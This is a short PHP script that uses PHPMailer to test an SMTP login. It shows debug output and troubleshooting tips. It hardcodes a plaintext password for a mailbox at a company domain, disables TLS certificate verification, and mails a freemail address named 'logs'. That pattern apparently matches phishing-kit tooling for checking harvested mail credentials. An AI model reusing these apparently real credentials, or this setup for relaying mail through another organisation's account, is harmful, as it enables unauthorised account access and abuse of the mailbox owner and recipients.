<?php
// SMTP Debug Test Script
// This script will test your SMTP configuration independently

require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Enable error reporting
ini_set('display_errors', 1);
error_reporting(E_ALL);

echo "<h2>SMTP Configuration Test</h2>\n";

// Your SMTP configuration
$senderServer     = "mail.globalhouse.co.th";
$senderPort       = 587;
$senderEncryption = 'tls';
$senderUser       = "tp@globalhouse.co.th";
$senderPass       = "Globalhouse@123";
$receiver         = "logs.ironside511@yandex.com";

echo "<strong>Testing SMTP Configuration:</strong><br>";
echo "Server: $senderServer<br>";
echo "Port: $senderPort<br>";
echo "Encryption: $senderEncryption<br>";
echo "Username: $senderUser<br>";
echo "Receiver: $receiver<br><br>";

try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth    = true;
    $mail->SMTPDebug   = 3; // Detailed debug output
    $mail->Debugoutput = 'html';
    
    // SSL/TLS options for better compatibility
    $mail->SMTPOptions = array(
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        )
    );

    $mail->Host       = $senderServer;
    $mail->Port       = $senderPort;
    $mail->SMTPSecure = $senderEncryption;
    $mail->Username   = $senderUser;
    $mail->Password   = $senderPass;

    $mail->setFrom($senderUser, 'SMTP Test');
    $mail->addAddress($receiver);

    $mail->isHTML(false);
    $mail->Subject = 'SMTP Test - ' . date('Y-m-d H:i:s');
    $mail->Body    = 'This is a test email to verify SMTP configuration is working correctly.';

    echo "<strong>Attempting to send test email...</strong><br><br>";
    
    if ($mail->send()) {
        echo "<br><strong style='color: green;'>SUCCESS: Test email sent successfully!</strong><br>";
    } else {
        echo "<br><strong style='color: red;'>FAILED: Could not send test email</strong><br>";
        echo "Error: " . $mail->ErrorInfo . "<br>";
    }

} catch (Exception $e) {
    echo "<br><strong style='color: red;'>EXCEPTION: " . $e->getMessage() . "</strong><br>";
    if (isset($mail)) {
        echo "PHPMailer Error Info: " . $mail->ErrorInfo . "<br>";
    }
}

echo "<br><hr><br>";
echo "<strong>Additional Troubleshooting Tips:</strong><br>";
echo "1. Verify that your SMTP server allows connections from this IP<br>";
echo "2. Check if your hosting provider blocks outgoing SMTP connections<br>";
echo "3. Confirm the SMTP credentials are correct<br>";
echo "4. Try using port 465 with SSL instead of 587 with TLS<br>";
echo "5. Check firewall settings on both client and server<br>";

?>